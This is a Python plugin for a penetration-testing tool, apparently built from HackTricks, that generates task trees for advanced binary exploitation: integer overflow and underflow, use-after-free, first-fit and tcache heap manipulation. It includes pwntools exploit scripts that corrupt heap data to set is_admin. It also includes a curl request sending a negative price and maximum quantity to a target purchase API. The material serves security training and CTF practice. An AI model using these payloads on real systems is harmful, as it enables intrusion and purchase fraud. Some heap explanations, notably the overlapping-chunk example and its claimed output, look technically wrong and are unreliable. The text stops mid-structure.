"""
Advanced Binary Exploitation service plugin

Generates methodology tasks for advanced exploitation techniques including:
- Integer overflow and underflow vulnerabilities
- Signed/unsigned conversion attacks
- Use-After-Free (UAF) exploitation
- First-fit heap manipulation
- Heap grooming and overlapping chunks
- tcache and fastbin exploitation
- Race condition vulnerabilities (TOCTOU)
- Kernel exploitation primitives
- Memory corruption through timing attacks

Extracted from HackTricks:
- binary-exploitation/integer-overflow-and-underflow.md
- binary-exploitation/libc-heap/use-after-free/README.md
- binary-exploitation/libc-heap/use-after-free/first-fit.md
- binary-exploitation/linux-kernel-exploitation/posix-cpu-timers-toctou-cve-2025-38352.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class BinaryAdvancedExploitPlugin(ServicePlugin):
    """Advanced binary exploitation methodology plugin for OSCP/advanced CTFs"""

    @property
    def name(self) -> str:
        return "binary-advanced-exploit"

    @property
    def default_ports(self) -> List[int]:
        # Advanced binary exploitation is file/process-based, not port-based
        return []

    @property
    def service_names(self) -> List[str]:
        return ['advanced-binary', 'heap-exploit', 'integer-overflow', 'uaf', 'race-condition']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Advanced binary exploitation is manually triggered.
        Returns True if explicitly marked for advanced binary analysis.
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()

        return (
            'advanced-binary' in service or
            'heap-exploit' in service or
            'integer-overflow' in service or
            'uaf' in service or
            'race' in service or
            port_info.get('advanced_binary_analysis', False)
        )

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate advanced binary exploitation methodology task tree"""
        binary_path = service_info.get('binary_path', '/path/to/binary')
        platform = service_info.get('platform', 'linux').lower()
        exploit_type = service_info.get('exploit_type', 'all')

        tasks = {
            'id': 'advanced-binary-exploit-methodology',
            'name': 'Advanced Binary Exploitation Methodology',
            'type': 'parent',
            'children': []
        }

        # Add vulnerability-specific task trees based on exploit_type
        if exploit_type in ['all', 'integer']:
            tasks['children'].append(self._create_integer_overflow_tree(binary_path, platform, target))

        if exploit_type in ['all', 'uaf', 'heap']:
            tasks['children'].append(self._create_uaf_exploitation_tree(binary_path, platform))

        if exploit_type in ['all', 'race', 'toctou']:
            tasks['children'].append(self._create_race_condition_tree(binary_path, platform))

        # Add cross-cutting analysis tasks
        tasks['children'].append(self._create_heap_analysis_tree(binary_path, platform))
        tasks['children'].append(self._create_exploit_development_tree(binary_path, platform))

        return tasks

    def _create_integer_overflow_tree(self, binary_path: str, platform: str, target: str = '<TARGET>') -> Dict[str, Any]:
        """Create integer overflow/underflow exploitation task tree"""
        return {
            'id': 'integer-overflow-exploitation',
            'name': 'Integer Overflow/Underflow Exploitation',
            'type': 'parent',
            'children': [
                # Phase 1: Identify Integer Vulnerabilities
                {
                    'id': 'integer-vuln-identification',
                    'name': 'Phase 1: Identify Integer Vulnerabilities',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'identify-integer-types',
                            'name': 'Identify Integer Type Usage',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Map all integer types and their boundaries in the binary',
                                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ANALYSIS'],
                                'notes': '''Integer type boundaries (critical for exploitation):
- int8_t: -128 to 127 | uint8_t: 0 to 255
- int16_t: -32,768 to 32,767 | uint16_t: 0 to 65,535
- int32_t: -2,147,483,648 to 2,147,483,647 | uint32_t: 0 to 4,294,967,295
- int64_t: -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807
- uint64_t: 0 to 18,446,744,073,709,551,615

Common mappings (64-bit systems):
- short = int16_t
- int = int32_t
- long = int64_t
''',
                                'success_indicators': [
                                    'All size/count variables identified',
                                    'Type casts documented',
                                    'User-controlled inputs mapped to integer operations'
                                ],
                                'next_steps': [
                                    'Look for arithmetic operations on user input',
                                    'Check for type conversions (especially signed/unsigned)',
                                    'Identify memory allocation size calculations',
                                    'Search for multiplication without overflow checks'
                                ],
                                'alternatives': [
                                    'Static analysis: grep for malloc/calloc with multiplication',
                                    'IDA/Ghidra: Review decompiled code for size_t calculations',
                                    'Manual: Check limits.h constants (INT_MAX, UINT_MAX)'
                                ]
                            }
                        },
                        {
                            'id': 'test-max-values',
                            'name': 'Test Maximum Value Boundaries',
                            'type': 'command',
                            'metadata': {
                                'command': f'python3 -c "print(2147483647); print(4294967295); print(9223372036854775807)"',
                                'description': 'Generate maximum values for testing integer boundaries',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    '2147483647': 'INT32_MAX (int32_t maximum)',
                                    '4294967295': 'UINT32_MAX (uint32_t maximum)',
                                    '9223372036854775807': 'INT64_MAX (int64_t maximum)'
                                },
                                'success_indicators': [
                                    'Maximum values calculated for target integer types',
                                    'Boundary values ready for fuzzing'
                                ],
                                'failure_indicators': [
                                    'Wrong architecture assumptions (32-bit vs 64-bit)'
                                ],
                                'next_steps': [
                                    'Send max value + 1 to trigger overflow',
                                    'Send negative values for unsigned conversions',
                                    'Test multiplication that exceeds type bounds'
                                ],
                                'alternatives': [
                                    'C program: #include <limits.h>; printf("%d", INT_MAX)',
                                    'Python: import sys; print(sys.maxsize)',
                                    'Manual calculation: 2^bits - 1 for unsigned'
                                ],
                                'notes': 'For web applications: test API endpoints with max integer values in JSON/params'
                            }
                        },
                        {
                            'id': 'create-overflow-test-program',
                            'name': 'Create Integer Overflow Test Program',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create test program to verify overflow behavior on target platform',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'notes': '''Pure Overflow Test (C):
```c
#include <stdio.h>

int main() {
    unsigned char max = 255;
    unsigned char result = max + 1;
    printf("Result: %d\\n", result); // Should print 0
    return 0;
}
```

Signed/Unsigned Conversion Test:
```c
#include <stdio.h>

int main() {
    int userInput = -1;
    unsigned int processed = (unsigned int)userInput;

    if (processed > 1000) {
        printf("Large: %u\\n", processed); // Will trigger!
    }
    return 0;
}
```

Compile: gcc -o overflow_test overflow_test.c -O0 -fno-stack-protector
''',
                                'success_indicators': [
                                    'Overflow behavior confirmed on target architecture',
                                    'Negative-to-unsigned conversion tested',
                                    'Wraparound behavior documented'
                                ],
                                'alternatives': [
                                    'Python simulation: (255 + 1) & 0xFF',
                                    'Online C compiler for quick tests',
                                    'Rust: use overflowing_add/overflowing_mul methods'
                                ]
                            }
                        }
                    ]
                },

                # Phase 2: Integer Overflow to Heap Corruption
                {
                    'id': 'integer-to-heap-corruption',
                    'name': 'Phase 2: Integer Overflow to Heap Corruption',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'identify-undersized-allocation',
                            'name': 'Identify Undersized Allocation Pattern',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Find vulnerable allocation patterns: user_count * user_size = alloc_size',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'ANALYSIS'],
                                'notes': '''Classic Vulnerability Pattern:

1. User controls count and element_size
2. Product calculated in 32-bit (wraps to 0)
3. Small allocation performed
4. Large copy operation uses 64-bit product (huge number)

Vulnerable Code Example:
```c
size_t count = user_input_1;      // 4294967296 (2^32)
size_t elem_size = user_input_2;  // 1
uint32_t product32 = (uint32_t)(count * elem_size); // Wraps to 0
uint32_t alloc32 = product32 + 32; // = 32 bytes
char *buf = malloc(alloc32);       // Only 32 bytes allocated

size_t to_copy = count * elem_size; // Huge: 4294967296
read(stdin, buf, to_copy);          // HEAP OVERFLOW!
```

Key Indicators:
- Type conversion to smaller integer (size_t → uint32_t)
- Arithmetic before allocation
- Different calculation for copy/write operation
''',
                                'success_indicators': [
                                    'Allocation size calculation identified',
                                    'Type conversion vulnerability found',
                                    'Copy operation uses different calculation'
                                ],
                                'next_steps': [
                                    'Calculate overflow values: send 2^32 for 32-bit wrap',
                                    'Identify adjacent heap objects to overwrite',
                                    'Test with values that wrap to small allocations'
                                ],
                                'alternatives': [
                                    'Static analysis: grep for (uint32_t).*malloc',
                                    'Dynamic: ltrace/strace to see actual malloc sizes',
                                    'Fuzzing: Send INT_MAX, UINT_MAX as size parameters'
                                ]
                            }
                        },
                        {
                            'id': 'calculate-magic-overflow-values',
                            'name': 'Calculate Magic Overflow Values',
                            'type': 'command',
                            'metadata': {
                                'command': 'python3 -c "print(\'32-bit wrap:\', 2**32); print(\'Offset 48:\', 2**32, \'* 1 = 0 in uint32_t\'); print(\'Underflow:\', 8, \'- 16 =\", 8 - 16, \'(size_t)\')"',
                                'description': 'Calculate values that cause integer wrap/underflow to small allocations',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    '2**32': 'Wraps to 0 when cast to uint32_t (4,294,967,296)',
                                    '8 - 16': 'Underflows to 0xfffffffffffffff8 on 64-bit unsigned'
                                },
                                'success_indicators': [
                                    'Values calculated that wrap to desired allocation size',
                                    'Underflow values produce huge copy sizes'
                                ],
                                'next_steps': [
                                    'Send calculated count value as program input',
                                    'For overflow: send 4294967296 as count, 1 as size',
                                    'For underflow: send total_len < HEADER constant',
                                    'Craft payload to overwrite adjacent objects'
                                ],
                                'alternatives': [
                                    'Manual calculation: (target_alloc - header) in 32-bit math',
                                    'Python: (0x100000000 * elem) & 0xFFFFFFFF',
                                    'GDB: print /x (uint32_t)(4294967296 * 1)'
                                ],
                                'notes': '''macOS arm64 Example Values:
- Count: 4294967296 (0x100000000)
- Element size: 1
- Result: uint32_t product = 0, alloc = 32 bytes
- But size_t copy = 4294967296 (huge overflow!)

Underflow Example:
- Total length: 8
- Header size: 16
- payload_len = 8 - 16 = -8 = 0xfffffffffffffff8 (huge!)
'''
                            }
                        },
                        {
                            'id': 'compile-overflow-poc',
                            'name': 'Compile Integer Overflow PoC',
                            'type': 'command',
                            'metadata': {
                                'command': f'clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 -o int_ovf_heap int_ovf_heap.c',
                                'description': 'Compile integer overflow PoC with protections disabled for testing',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'flag_explanations': {
                                    '-O0': 'No optimization (preserves vulnerable code patterns)',
                                    '-Wall -Wextra': 'Enable all warnings to see potential issues',
                                    '-std=c11': 'Use C11 standard',
                                    '-D_FORTIFY_SOURCE=0': 'Disable buffer overflow protections for PoC testing',
                                    '-o int_ovf_heap': 'Output executable name'
                                },
                                'success_indicators': [
                                    'Binary compiled successfully',
                                    'No optimization applied (vulnerable patterns preserved)',
                                    'Protections disabled for testing'
                                ],
                                'failure_indicators': [
                                    'Compiler errors on type conversions',
                                    'Fortify source preventing compilation',
                                    'Optimization removing vulnerable code'
                                ],
                                'next_steps': [
                                    'Test with: echo "4294967296\\n1" | ./int_ovf_heap',
                                    'Send payload after prompts to trigger overflow',
                                    'Verify heap corruption with GDB heap inspection'
                                ],
                                'alternatives': [
                                    'gcc -O0 -fno-stack-protector -z execstack -no-pie',
                                    'clang with Address Sanitizer: -fsanitize=address',
                                    'Cross-compile for target: -march=arm64 -target aarch64-linux-gnu'
                                ],
                                'notes': 'For production targets: re-enable protections and test if overflow still works'
                            }
                        }
                    ]
                },

                # Phase 3: Exploitation
                {
                    'id': 'integer-overflow-exploitation',
                    'name': 'Phase 3: Exploit Integer Overflow',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'craft-overflow-payload',
                            'name': 'Craft Heap Overflow Payload',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create payload to overflow heap and corrupt adjacent structures',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'notes': '''Python Exploit Template (pwntools):

```python
from pwn import *

context.log_level = "info"
EXE = "./int_ovf_heap"

def main():
    io = process([EXE])  # Use pipes, not PTY

    # Send overflow values
    io.sendlineafter(b"Entry count: ", b"4294967296")  # 2^32
    io.sendlineafter(b"Entry size: ", b"1")

    # Wait for payload prompt
    io.recvuntil(b">> Send bundle payload")

    # Calculate offset to target structure
    # offset = alloc32 + gap = 32 + 16 = 48 bytes
    payload = b"A" * 48 + p32(1)  # Overflow + flip is_admin to 1

    # Send payload and EOF
    io.send(payload)
    io.shutdown("send")  # EOF signal

    # Receive flag
    print(io.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
    main()
```

Key Exploit Steps:
1. Trigger integer wrap to small allocation (32 bytes)
2. Large copy size overwrites adjacent heap chunk
3. Overwrite sensitive field (is_admin, function pointer, etc.)
4. Send EOF to stop read loop
5. Trigger privileged code path
''',
                                'success_indicators': [
                                    'Payload reaches target offset correctly',
                                    'Adjacent structure overwritten',
                                    'Privilege escalation achieved (is_admin = 1)',
                                    'Flag/shell obtained'
                                ],
                                'next_steps': [
                                    'Test in GDB to verify offsets',
                                    'Adjust padding if structure layout differs',
                                    'For remote: adapt to network socket instead of stdin'
                                ],
                                'alternatives': [
                                    'Manual: echo -e "4294967296\\n1\\n" | cat payload.bin - | nc target port',
                                    'Pure Python: socket.send() with calculated overflow',
                                    'Metasploit: write custom integer overflow module'
                                ]
                            }
                        },
                        {
                            'id': 'test-underflow-variant',
                            'name': 'Test Integer Underflow Variant',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Exploit integer underflow where total_len < HEADER causes huge size_t',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'notes': '''Underflow Pattern:

```c
const size_t HEADER = 16;
size_t total_len = user_input;        // User sends: 8
size_t payload_len = total_len - HEADER;  // 8 - 16 = -8
// Result: 0xfffffffffffffff8 (18,446,744,073,709,551,608)

char *buf = malloc(total_len);        // Only 8 bytes!
read(stdin, buf, payload_len);        // HUGE overflow!
```

Exploitation:
1. Send total_len < HEADER (e.g., 8 when HEADER=16)
2. Underflow creates huge payload_len
3. Adjacent session struct is 24 bytes away (8 + 16 gap)
4. Overwrite is_admin at offset 24

Python Exploit:
```python
io = process([EXE])
io.sendlineafter(b"Total packet length: ", b"8")
io.recvuntil(b">> Send payload")

# offset_to_sess = total_len + 16 = 8 + 16 = 24
payload = b"A" * 24 + p32(1)
io.send(payload)
io.shutdown("send")
print(io.recvall(timeout=5).decode())
```
''',
                                'success_indicators': [
                                    'Underflow confirmed (huge size_t value)',
                                    'Overflow reaches adjacent structure',
                                    'Privilege check bypassed'
                                ],
                                'alternatives': [
                                    'Test multiple underflow values: 0, 1, HEADER-1',
                                    'GDB: x/32gx buf to visualize heap layout',
                                    'AddressSanitizer: compile with -fsanitize=address to see overflow'
                                ]
                            }
                        },
                        {
                            'id': 'bypass-length-checks',
                            'name': 'Bypass Length Checks with Overflow',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use 1-byte size storage overflow to bypass password length restrictions',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'notes': '''Classic CTF Pattern (ARM64/x86-64):

Vulnerable Code:
```c
unsigned char password_len;  // Only 1 byte!
scanf("%hhu", &password_len);

if (password_len > 10) {
    printf("Password too long!\\n");
    exit(1);
}

char password_buf[16];
read(stdin, password_buf, password_len);
```

Attack:
1. Send password_len = 260
2. Stored as: 260 % 256 = 4 (bypasses check!)
3. But scanf may read 260 bytes
4. Overflow overwrites next local variable on stack
5. Bypass both length check AND overwrite return address

Exploitation Steps:
- Calculate: (desired_length) % 256 to bypass check
- Send 260 (0x104) → stored as 4, passes check
- Actual read still uses full value (depending on implementation)
- Overwrite stack variables or saved RIP

Reference: https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/
''',
                                'success_indicators': [
                                    'Length check bypassed with modulo wrap',
                                    'Buffer overflow achieved',
                                    'Adjacent variable overwritten'
                                ],
                                'alternatives': [
                                    'Test values: 256, 260, 512 (multiples + offset)',
                                    'Static analysis: look for unsigned char size variables',
                                    'Fuzzing: Send sizes 0-512 to find wrap points'
                                ]
                            }
                        }
                    ]
                },

                # Phase 4: Advanced Techniques
                {
                    'id': 'integer-advanced-techniques',
                    'name': 'Phase 4: Advanced Integer Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'z3-constraint-solving',
                            'name': 'Use Z3 for Integer Constraint Solving',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Solve complex integer constraints using Z3 theorem prover',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'AUTOMATED'],
                                'notes': '''Z3 Solver for Integer Reversing:

Problem: Find input that satisfies:
```
(((input * 0x1064deadbeef4601) & 0xffffffffffffffff) == 0xD1038D2E07B42569)
```

Z3 Solution:
```python
from z3 import *

solver = Solver()
input_val = BitVec('input', 64)

# Add constraint
solver.add((input_val * 0x1064deadbeef4601) & 0xffffffffffffffff == 0xD1038D2E07B42569)

# Solve
if solver.check() == sat:
    model = solver.model()
    solution = model[input_val].as_long()
    print(f"Solution: {solution}")
    print(f"Hex: {hex(solution)}")
```

Applications:
- Reverse engineering license checks
- Finding inputs for specific hash values
- Solving multiplication/overflow puzzles
- CTF reversing challenges

Reference: https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/
''',
                                'success_indicators': [
                                    'Z3 solver finds valid solution',
                                    'Solution verified in original binary',
                                    'Constraint satisfied'
                                ],
                                'alternatives': [
                                    'Manual: brute-force small input ranges',
                                    'angr symbolic execution for complex constraints',
                                    'Python: iterate possible values with modulo arithmetic'
                                ],
                                'notes': 'Install Z3: pip3 install z3-solver'
                            }
                        },
                        {
                            'id': 'web-api-integer-overflow',
                            'name': 'Test Web APIs for Integer Overflow',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -X POST http://{target}/api/purchase -H "Content-Type: application/json" -d \'{{"item_id": 1, "quantity": 2147483647, "price": -1}}\'',
                                'description': 'Test web application APIs for integer overflow in price calculations',
                                'tags': ['OSCP:MEDIUM', 'WEB', 'QUICK_WIN'],
                                'flag_explanations': {
                                    '-X POST': 'HTTP POST request method',
                                    '-H "Content-Type: application/json"': 'Set JSON content type header',
                                    '-d': 'Request body data',
                                    'quantity: 2147483647': 'INT_MAX to trigger overflow',
                                    'price: -1': 'Negative price for signed/unsigned conversion'
                                },
                                'success_indicators': [
                                    'Total price becomes negative or zero',
                                    'Order processed with invalid total',
                                    'Free or discounted items obtained',
                                    'Server 500 error (integer overflow crash)'
                                ],
                                'failure_indicators': [
                                    'Input validation rejects extreme values',
                                    'Server-side type checking prevents overflow',
                                    'Transaction rolled back'
                                ],
                                'next_steps': [
                                    'Test with UINT_MAX: 4294967295',
                                    'Try negative quantities: -1, -100',
                                    'Test multiplication overflow: large quantity * price',
                                    'Check for discount calculation overflows'
                                ],
                                'alternatives': [
                                    'Burp Suite: Send to Repeater, modify JSON values',
                                    'Python requests: requests.post(url, json=payload)',
                                    'Manual browser: Open DevTools, modify request'
                                ],
                                'notes': '''Common Web Integer Vulnerabilities:
- Shopping cart total calculation (quantity * price)
- Discount/coupon calculations
- Transfer amount limits (send UINT_MAX)
- Token/credit balance systems
- Pagination offset/limit parameters
'''
                            }
                        },
                        {
                            'id': 'arm64-integer-exploitation',
                            'name': 'ARM64 Integer Exploitation Notes',
                            'type': 'manual',
                            'metadata': {
                                'description': 'ARM64-specific integer overflow exploitation techniques',
                                'tags': ['OSCP:LOW', 'ARM64', 'ADVANCED'],
                                'notes': '''ARM64 Integer Overflow (No Change from x86-64):

Integer arithmetic behavior is identical across architectures:
- Same integer type sizes (int32_t, uint32_t, etc.)
- Same overflow/underflow wraparound behavior
- Same signed/unsigned conversion rules

ARM64-Specific Considerations:
1. **Registers**: x0-x30 (64-bit), w0-w30 (32-bit lower halves)
2. **Function arguments**: x0-x7 (first 8 args)
3. **Return value**: x0
4. **Stack grows downward** (like x86-64)
5. **Pointer Authentication (PAC)**: Modern iOS/macOS
   - Doesn't affect integer overflow primitives
   - May affect pointer overwrite exploitation

Exploitation is the same:
```c
uint32_t product32 = (uint32_t)(count * elem_size);  // Wraps on ARM64 too
```

GDB Commands (ARM64):
- info registers x0 x1 x2  # View argument registers
- x/32gx $sp                # Examine stack
- x/i $pc                   # Current instruction

Reference: https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/
''',
                                'success_indicators': [
                                    'Integer overflow confirmed on ARM64',
                                    'Exploitation techniques adapted',
                                    'Payload works on target architecture'
                                ],
                                'alternatives': [
                                    'QEMU user mode emulation: qemu-aarch64 -L /usr/aarch64-linux-gnu binary',
                                    'Cross-compile: aarch64-linux-gnu-gcc',
                                    'Android device debugging via adb'
                                ]
                            }
                        }
                    ]
                }
            ]
        }

    def _create_uaf_exploitation_tree(self, binary_path: str, platform: str) -> Dict[str, Any]:
        """Create Use-After-Free exploitation task tree"""
        return {
            'id': 'uaf-exploitation',
            'name': 'Use-After-Free (UAF) Exploitation',
            'type': 'parent',
            'children': [
                # Phase 1: Identify UAF Vulnerability
                {
                    'id': 'uaf-identification',
                    'name': 'Phase 1: Identify UAF Vulnerability',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'understand-uaf-basics',
                            'name': 'Understand UAF Fundamentals',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Learn Use-After-Free vulnerability pattern and exploitation primitives',
                                'tags': ['OSCP:HIGH', 'THEORY', 'MANUAL'],
                                'notes': '''Use-After-Free (UAF) Fundamentals:

What is UAF?
1. Program allocates heap memory for object
2. Stores data (function pointers, sensitive info)
3. Frees memory (returned to allocator)
4. **Continues to use pointer to freed memory**

Why It's Dangerous:
- No error when accessing freed memory
- Freed memory can be reallocated
- Attacker can control reallocated data
- Original pointer now points to attacker data

Classic UAF Pattern:
```c
struct user {
    void (*print_info)(void);  // Function pointer
    char *password;
};

struct user *u = malloc(sizeof(struct user));
u->print_info = &safe_print;
// ... use user ...
free(u);  // Memory freed but pointer remains

// Later: program still uses 'u'
u->print_info();  // UAF! Calls whatever is now at that address
```

Exploitation Goal:
- Reallocate freed chunk with attacker data
- Overwrite function pointers, vtable pointers, etc.
- Gain code execution or bypass security checks
''',
                                'success_indicators': [
                                    'UAF pattern identified in binary',
                                    'Free/use sequence documented',
                                    'Sensitive data in freed object identified'
                                ],
                                'next_steps': [
                                    'Trace all malloc/free calls',
                                    'Identify dangling pointer usage',
                                    'Map object structure layout',
                                    'Find allocation primitives to control reuse'
                                ]
                            }
                        },
                        {
                            'id': 'trace-heap-operations',
                            'name': 'Trace Heap Allocation/Free Operations',
                            'type': 'command',
                            'metadata': {
                                'command': f'ltrace -e malloc,free,calloc,realloc {binary_path}',
                                'description': 'Trace all heap operations to identify allocation/free patterns',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                                'flag_explanations': {
                                    'ltrace': 'Library call tracer (tracks libc calls)',
                                    '-e malloc,free,calloc,realloc': 'Filter to heap allocation functions only',
                                    binary_path: 'Target binary to analyze'
                                },
                                'success_indicators': [
                                    'All malloc/free pairs identified',
                                    'Allocation sizes logged',
                                    'Free-then-use patterns visible',
                                    'Reallocation opportunities found'
                                ],
                                'failure_indicators': [
                                    'ltrace not installed',
                                    'Binary is statically linked (no libc calls)',
                                    'Anti-debugging prevents tracing'
                                ],
                                'next_steps': [
                                    'Map freed objects to later dereferences',
                                    'Identify which freed chunks get reused',
                                    'Check if freed pointers are nulled (if yes, harder to exploit)',
                                    'Look for object type confusion (freed as X, reused as Y)'
                                ],
                                'alternatives': [
                                    'GDB: break on malloc/free with commands',
                                    'strace -e trace=memory for syscalls',
                                    'Valgrind: valgrind --leak-check=full --track-origins=yes',
                                    'AddressSanitizer: compile with -fsanitize=address'
                                ],
                                'notes': 'For stripped binaries: use gdb with breakpoint on malloc@plt'
                            }
                        },
                        {
                            'id': 'identify-heap-allocator',
                            'name': 'Identify Heap Allocator Type',
                            'type': 'command',
                            'metadata': {
                                'command': f'ldd {binary_path} | grep libc',
                                'description': 'Identify which libc version and heap allocator is in use',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    'ldd': 'List dynamic dependencies (shared libraries)',
                                    'grep libc': 'Filter to libc library version'
                                },
                                'success_indicators': [
                                    'glibc version identified (e.g., 2.31, 2.38)',
                                    'Heap allocator determined (glibc malloc, tcache, etc.)',
                                    'System libc path located'
                                ],
                                'next_steps': [
                                    'Check glibc version: ldd --version',
                                    'If glibc >= 2.26: tcache is enabled (important!)',
                                    'If glibc >= 2.32: safe-linking in tcache/fastbin',
                                    'Research allocator-specific exploitation techniques'
                                ],
                                'alternatives': [
                                    'strings binary | grep GLIBC_',
                                    'readelf -d binary | grep NEEDED',
                                    'Manual: check /lib/x86_64-linux-gnu/libc.so.6'
                                ],
                                'notes': '''Allocator Behavior by glibc Version:

< 2.26: No tcache, fastbin/unsorted bin only
>= 2.26: tcache per-thread (7 chunks per size)
>= 2.32: safe-linking XOR obfuscation in tcache
>= 2.38: Additional hardening checks

This affects UAF exploitation strategy!
'''
                            }
                        }
                    ]
                },

                # Phase 2: First-Fit Exploitation
                {
                    'id': 'first-fit-exploitation',
                    'name': 'Phase 2: First-Fit Heap Manipulation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'understand-first-fit',
                            'name': 'Understand First-Fit Behavior',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Learn first-fit allocation strategy and exploitation primitives',
                                'tags': ['OSCP:HIGH', 'THEORY', 'MANUAL'],
                                'notes': '''First-Fit Allocation Strategy:

Unsorted Bin (non-fastbin chunks):
- Free adds to HEAD of list
- Allocation searches from TAIL
- If chunk is larger than request: **split**
  - Front part returned to user
  - Remainder stays in unsorted bin
- LIFO-like behavior with splitting

Fastbins (small chunks):
- Free adds to HEAD
- Allocation takes from HEAD
- Pure LIFO (Last-In-First-Out)
- No splitting

Example (Unsorted Bin):
```c
char *a = malloc(300);  // Allocate
char *b = malloc(250);  // Allocate
free(a);                // a → unsorted bin (head)
char *c = malloc(250);  // Searches from tail, finds 'a', splits it
// c points to first 250 bytes of old 'a'
// Remaining 50 bytes stay in unsorted bin
```

Example (Fastbin):
```c
char *a = malloc(20);
char *b = malloc(20);
free(a);  // fastbin: [a]
free(b);  // fastbin: [b, a]
a = malloc(20);  // Returns b (LIFO)
b = malloc(20);  // Returns a
```

Key Insight: Control allocation order to reuse freed chunks!
''',
                                'success_indicators': [
                                    'Allocator behavior understood',
                                    'Free order affects allocation order',
                                    'Splitting behavior documented'
                                ],
                                'next_steps': [
                                    'Identify allocation sizes in target binary',
                                    'Plan free/alloc sequence to control reuse',
                                    'Test with proof-of-concept program'
                                ]
                            }
                        },
                        {
                            'id': 'tcache-awareness',
                            'name': 'Modern glibc: tcache Considerations',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Understand tcache impact on first-fit exploitation (glibc >= 2.26)',
                                'tags': ['OSCP:HIGH', 'MODERN', 'THEORY'],
                                'notes': '''tcache (Thread-Local Cache) - glibc >= 2.26:

What Changed:
- Each thread maintains its own cache
- 64 size classes (0x20 to 0x420 bytes on 64-bit)
- Holds up to 7 chunks per size class
- **Checked BEFORE unsorted bin**

Impact on First-Fit:
- Classic first-fit only works if:
  1. Chunk size > 0x420 (tcache_max), OR
  2. tcache bin is full (already 7 chunks), OR
  3. tcache bin manually drained

Bypassing tcache:
```c
// Drain tcache for target size
void *pool[7];
for(int i = 0; i < 7; i++) pool[i] = malloc(0x100);
for(int i = 0; i < 7; i++) free(pool[i]);  // Fill tcache

// Now tcache is full, next free goes to unsorted bin
void *victim = malloc(0x100);
free(victim);  // → unsorted bin (not tcache)

// Classic first-fit now works
void *reuse = malloc(0x80);  // Splits victim chunk
```

Safe-Linking (glibc >= 2.32):
- tcache/fastbin pointers XORed with heap address
- Requires heap leak to forge pointers
- Unsorted/small/large bins still use raw pointers!

Exploitation Strategy:
1. Use chunks > 0x420 to avoid tcache
2. Or drain tcache explicitly
3. Or use unsorted bin splitting technique
''',
                                'success_indicators': [
                                    'tcache behavior understood',
                                    'Bypass strategy planned',
                                    'Chunk sizes chosen to avoid/use tcache'
                                ],
                                'next_steps': [
                                    'Check glibc version: ldd --version',
                                    'Test tcache bypass in proof-of-concept',
                                    'Allocate chunks > 0x420 for direct unsorted bin'
                                ]
                            }
                        },
                        {
                            'id': 'create-overlapping-chunks',
                            'name': 'Create Overlapping Chunk UAF',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Exploit first-fit splitting to create overlapping heap chunks',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'ADVANCED'],
                                'notes': '''Overlapping Chunk Technique (glibc 2.38):

Goal: Make two pointers reference overlapping memory

Steps:
1. Allocate A (size > 0x420 to bypass tcache)
2. Allocate B (adjacent, prevent consolidation)
3. Free A → unsorted bin
4. Allocate C (smaller than A) → splits A
   - C gets lower part of A
   - Remainder stays in unsorted bin
5. Allocate C2 (same size) → gets remainder
   - **C2 overlaps with B!**

Code Example:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
    setbuf(stdout, NULL);

    char *A = malloc(0x420);  // > tcache_max
    char *B = malloc(0x420);  // Adjacent chunk
    strcpy(A, "AAAA\\n");
    free(A);                  // A → unsorted bin

    char *C = malloc(0x400);  // Split: returns lower part of A

    // Remainder of A is 0x20 bytes, stays in unsorted bin
    char *C2 = malloc(0x400); // Returns remainder → OVERLAPS B!

    printf("B  = %p\\nC2 = %p (overlaps B)\\n", B, C2);

    // Arbitrary write in B is visible via C2
    memset(B, 'X', 0x10);
    fwrite(C2, 1, 0x10, stdout);  // Prints Xs - overlap confirmed!
}
```

Compile: gcc -o overlap overlap.c -O0 -no-pie

Why This Works:
- A freed into unsorted bin (size 0x420)
- Allocate 0x400: returns first 0x400 bytes
- Remainder 0x20 stays in unsorted
- Next 0x400 alloc wraps around to B's location

Exploitation:
- Overwrite function pointers via B
- Modify them via C2 (UAF primitive)
- Bypass heap metadata protections
''',
                                'success_indicators': [
                                    'Overlapping pointers created',
